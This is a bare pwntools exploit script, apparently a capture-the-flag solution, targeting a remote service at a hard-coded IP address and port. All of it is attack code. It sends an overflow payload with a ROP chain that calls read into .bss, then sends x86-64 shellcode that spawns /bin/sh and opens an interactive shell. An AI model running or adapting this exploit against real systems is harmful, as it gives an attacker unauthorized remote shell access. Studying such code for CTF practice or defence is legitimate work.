from pwn import * 
bss = 0x601030
read_plt = 0x400400

#p = process("./start")

p = remote("139.59.114.220", 10001)

context.bits = 64 

pop_rsi = 0x00000000004005c1

payload  = "\x90"*24
payload += pack(pop_rsi)
payload += pack(bss)
payload += pack(0)
payload += pack(read_plt)
payload += pack(bss)

#payload += pack(0)
#payload += pack(bss)
#payload += pack(0x50)

shellcode = "\x90"*10+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+"\x90"*10

p.sendline(payload+"\x90"*(0x400-len(payload)-1))

p.sendline(shellcode)

p.interactive()


